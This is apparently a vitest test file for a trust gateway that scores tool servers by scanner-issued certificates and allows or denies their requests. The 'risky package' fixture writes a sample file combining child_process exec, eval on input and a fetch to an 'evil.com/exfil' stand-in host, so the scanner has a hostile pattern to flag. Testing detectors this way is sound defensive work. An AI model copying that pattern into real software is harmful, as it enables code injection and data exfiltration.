import { describe, it, expect, beforeEach } from 'vitest';
import { TrustGateway, TrustStore } from '../index.js';
import { loadConfig, validateConfig, type GatewayConfig, type ServerPolicy } from '../config.js';
import { InMemoryKeyProvider, publicKeyToDid } from '@sentinel-atl/core';
import { scan, issueSTC, type SentinelTrustCertificate } from '@sentinel-atl/scanner';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// ─── Helpers ──────────────────────────────────────────────────────────

async function makeIdentity(kp: InMemoryKeyProvider) {
  await kp.generate('test-key');
  const pubKey = await kp.getPublicKey('test-key');
  const did = publicKeyToDid(pubKey);
  return { keyId: 'test-key', did };
}

async function createTempPackage(files: Record<string, string>): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'sentinel-gw-'));
  for (const [name, content] of Object.entries(files)) {
    const dirPath = join(dir, name.split('/').slice(0, -1).join('/'));
    if (name.includes('/')) await mkdir(dirPath, { recursive: true });
    await writeFile(join(dir, name), content, 'utf-8');
  }
  return dir;
}

async function makeSTCForCleanPackage(kp: InMemoryKeyProvider, identity: { keyId: string; did: string }): Promise<SentinelTrustCertificate> {
  const dir = await createTempPackage({
    'package.json': JSON.stringify({ name: '@test/clean-server', version: '1.0.0' }),
    'src/index.ts': 'export function handler() { return "ok"; }\n',
  });
  const report = await scan({ packagePath: dir, skipDependencies: true });
  return issueSTC(kp, {
    scanReport: report,
    codeHash: 'abc123',
    issuerDid: identity.did,
    issuerKeyId: identity.keyId,
  });
}

async function makeSTCForRiskyPackage(kp: InMemoryKeyProvider, identity: { keyId: string; did: string }): Promise<SentinelTrustCertificate> {
  const dir = await createTempPackage({
    'package.json': JSON.stringify({ name: '@test/risky-server', version: '1.0.0' }),
    'src/evil.ts': 'import { exec } from "node:child_process";\nconst r = eval(input);\nawait fetch("https://evil.com/exfil");\n',
  });
  const report = await scan({ packagePath: dir, skipDependencies: true });
  return issueSTC(kp, {
    scanReport: report,
    codeHash: 'def456',
    issuerDid: identity.did,
    issuerKeyId: identity.keyId,
  });
}

function makeConfig(overrides?: Partial<GatewayConfig>): GatewayConfig {
  return {
    gateway: {
      name: 'test-gateway',
      port: 3100,
      mode: 'strict',
      ...(overrides?.gateway ?? {}),
    },
    servers: overrides?.servers ?? [
      { name: 'filesystem', upstream: 'stdio://node server.js' },
    ],
  };
}

// ─── Config Validation Tests ──────────────────────────────────────────

describe('validateConfig', () => {
  it('accepts a valid config', () => {
    const errors = validateConfig(makeConfig());
    expect(errors).toHaveLength(0);
  });

  it('rejects missing gateway name', () => {
    const config = makeConfig();
    (config.gateway as any).name = '';
    const errors = validateConfig(config);
    expect(errors.some(e => e.path === 'gateway.name')).toBe(true);
  });

  it('rejects invalid port', () => {
    const config = makeConfig();
    config.gateway.port = 99999;
    const errors = validateConfig(config);
    expect(errors.some(e => e.path === 'gateway.port')).toBe(true);
  });

  it('rejects invalid mode', () => {
    const config = makeConfig();
    (config.gateway as any).mode = 'yolo';
    const errors = validateConfig(config);
    expect(errors.some(e => e.path === 'gateway.mode')).toBe(true);
  });

  it('rejects invalid grade', () => {
    const config = makeConfig({ gateway: { name: 'x', port: 3100, mode: 'strict', minGrade: 'Z' } });
    const errors = validateConfig(config);
    expect(errors.some(e => e.path === 'gateway.minGrade')).toBe(true);
  });

  it('rejects invalid upstream protocol', () => {
    const config = makeConfig({ servers: [{ name: 'bad', upstream: 'ftp://evil.com' }] });
    const errors = validateConfig(config);
    expect(errors.some(e => e.message.includes('stdio://'))).toBe(true);
  });

  it('rejects invalid rate limit format', () => {
    const config = makeConfig({ servers: [{ name: 'x', upstream: 'stdio://node s.js', rateLimit: 'fast' }] });
    const errors = validateConfig(config);
    expect(errors.some(e => e.path.includes('rateLimit'))).toBe(true);
  });

  it('accepts valid rate limit formats', () => {
    const config = makeConfig({ servers: [
      { name: 'a', upstream: 'stdio://a', rateLimit: '100/min' },
      { name: 'b', upstream: 'stdio://b', rateLimit: '1000/hour' },
      { name: 'c', upstream: 'stdio://c', rateLimit: '10000/day' },
    ]});
    const errors = validateConfig(config);
    expect(errors).toHaveLength(0);
  });
});

// ─── Trust Store Tests ────────────────────────────────────────────────

describe('TrustStore', () => {
  let kp: InMemoryKeyProvider;
  let identity: { keyId: string; did: string };

  beforeEach(async () => {
    kp = new InMemoryKeyProvider();
    identity = await makeIdentity(kp);
  });

  it('adds and retrieves certificates', async () => {
    const store = new TrustStore();
    const stc = await makeSTCForCleanPackage(kp, identity);

    const stored = await store.addCertificate('filesystem', stc);
    expect(stored.verified).toBe(true);
    expect(stored.serverName).toBe('filesystem');

    expect(store.isVerified('filesystem')).toBe(true);
    expect(store.isVerified('unknown')).toBe(false);
  });

  it('detects expired certificates', async () => {
    const store = new TrustStore();
    const dir = await createTempPackage({
      'package.json': JSON.stringify({ name: '@test/expired', version: '1.0.0' }),
      'src/index.ts': 'export const x = 1;\n',
    });
    const report = await scan({ packagePath: dir, skipDependencies: true });
    const stc = await issueSTC(kp, {
      scanReport: report,
      codeHash: 'hash',
      issuerDid: identity.did,
      issuerKeyId: identity.keyId,
      validityHours: -1, // expired
    });

    await store.addCertificate('expired-server', stc);
    expect(store.isVerified('expired-server')).toBe(false);
  });

  it('removes certificates', async () => {
    const store = new TrustStore();
    const stc = await makeSTCForCleanPackage(kp, identity);
    await store.addCertificate('server', stc);

    expect(await store.remove('server')).toBe(true);
    expect(store.getCertificate('server')).toBeUndefined();
  });
});

// ─── Trust Gateway Tests ──────────────────────────────────────────────

describe('TrustGateway', () => {
  let kp: InMemoryKeyProvider;
  let identity: { keyId: string; did: string };
  let cleanSTC: SentinelTrustCertificate;
  let riskySTC: SentinelTrustCertificate;

  beforeEach(async () => {
    kp = new InMemoryKeyProvider();
    identity = await makeIdentity(kp);
    cleanSTC = await makeSTCForCleanPackage(kp, identity);
    riskySTC = await makeSTCForRiskyPackage(kp, identity);
  });

  it('allows requests for verified servers', async () => {
    const config = makeConfig({
      servers: [{ name: 'fs', upstream: 'stdio://node s.js' }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('fs', cleanSTC);

    const result = await gw.processRequest({
      serverName: 'fs',
      toolName: 'read_file',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(true);
    expect(result.decision).toBe('allow');
  });

  it('denies requests for unknown servers', async () => {
    const gw = new TrustGateway(makeConfig());

    const result = await gw.processRequest({
      serverName: 'unknown',
      toolName: 'read_file',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-unknown-server');
  });

  it('denies when certificate is required but missing', async () => {
    const config = makeConfig({
      servers: [{
        name: 'fs', upstream: 'stdio://node s.js',
        trust: { requireCertificate: true },
      }],
    });

    const gw = new TrustGateway(config);
    const result = await gw.processRequest({
      serverName: 'fs',
      toolName: 'read_file',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-no-cert');
  });

  it('denies when trust score is below minimum', async () => {
    const config = makeConfig({
      servers: [{
        name: 'risky', upstream: 'stdio://node s.js',
        trust: { minScore: 90 },
      }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('risky', riskySTC);

    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'exec',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-score');
  });

  it('denies when grade is below minimum', async () => {
    const config = makeConfig({
      servers: [{
        name: 'risky', upstream: 'stdio://node s.js',
        trust: { minGrade: 'A' },
      }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('risky', riskySTC);

    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'exec',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-grade');
  });

  it('denies when critical findings exceed maximum', async () => {
    const config = makeConfig({
      servers: [{
        name: 'risky', upstream: 'stdio://node s.js',
        trust: { maxFindingsCritical: 0 },
      }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('risky', riskySTC);

    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'anything',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-findings');
  });

  it('denies blocked tools', async () => {
    const config = makeConfig({
      servers: [{
        name: 'fs', upstream: 'stdio://node s.js',
        blockedTools: ['delete_file', 'write_file'],
      }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('fs', cleanSTC);

    const result = await gw.processRequest({
      serverName: 'fs',
      toolName: 'delete_file',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-blocked-tool');
  });

  it('denies tools not in allowedTools whitelist', async () => {
    const config = makeConfig({
      servers: [{
        name: 'fs', upstream: 'stdio://node s.js',
        allowedTools: ['read_file', 'list_directory'],
      }],
    });

    const gw = new TrustGateway(config);
    const result = await gw.processRequest({
      serverName: 'fs',
      toolName: 'write_file',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-not-allowed');
  });

  it('enforces rate limits', async () => {
    const config = makeConfig({
      servers: [{
        name: 'limited', upstream: 'stdio://node s.js',
        rateLimit: '2/min',
      }],
    });

    const gw = new TrustGateway(config);

    // First two should pass
    const r1 = await gw.processRequest({ serverName: 'limited', toolName: 'x', callerId: 'user-1' });
    const r2 = await gw.processRequest({ serverName: 'limited', toolName: 'x', callerId: 'user-1' });
    // Third should be rate limited
    const r3 = await gw.processRequest({ serverName: 'limited', toolName: 'x', callerId: 'user-1' });

    expect(r1.allowed).toBe(true);
    expect(r2.allowed).toBe(true);
    expect(r3.allowed).toBe(false);
    expect(r3.decision).toBe('deny-rate-limit');
  });

  it('warns but allows in permissive mode', async () => {
    const config: GatewayConfig = {
      gateway: { name: 'permissive-gw', port: 3100, mode: 'permissive' },
      servers: [{
        name: 'risky', upstream: 'stdio://node s.js',
        trust: { minScore: 99 },
      }],
    };

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('risky', riskySTC);

    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'exec',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(true);
    expect(result.decision).toBe('warn');
    expect(result.reason).toContain('WARN');
  });

  it('denies forbidden permissions', async () => {
    const config = makeConfig({
      servers: [{
        name: 'risky', upstream: 'stdio://node s.js',
        trust: { allowedPermissions: ['filesystem'] },
      }],
    });

    const gw = new TrustGateway(config);
    await gw.getTrustStore().addCertificate('risky', riskySTC);

    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'anything',
      callerId: 'user-1',
    });

    // Risky package has network + process permissions, only filesystem allowed
    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-permissions');
  });

  it('tracks stats correctly', async () => {
    const config = makeConfig({
      servers: [
        { name: 'fs', upstream: 'stdio://node s.js' },
        { name: 'blocked', upstream: 'stdio://node s.js', blockedTools: ['bad'] },
      ],
    });

    const gw = new TrustGateway(config);
    await gw.processRequest({ serverName: 'fs', toolName: 'read', callerId: 'u1' });
    await gw.processRequest({ serverName: 'blocked', toolName: 'bad', callerId: 'u1' });
    await gw.processRequest({ serverName: 'unknown-server', toolName: 'x', callerId: 'u1' });

    const stats = gw.getStats();
    expect(stats.totalRequests).toBe(3);
    expect(stats.allowed).toBe(1);
    expect(stats.denied).toBe(2);
  });

  it('applies global minTrustScore', async () => {
    const config: GatewayConfig = {
      gateway: { name: 'strict-gw', port: 3100, mode: 'strict', minTrustScore: 90 },
      servers: [{ name: 'risky', upstream: 'stdio://node s.js' }],
    };

    const gw = new TrustGateway(config);
    // No cert loaded — should deny because global score is required
    const result = await gw.processRequest({
      serverName: 'risky',
      toolName: 'anything',
      callerId: 'user-1',
    });

    expect(result.allowed).toBe(false);
    expect(result.decision).toBe('deny-no-cert');
  });
});
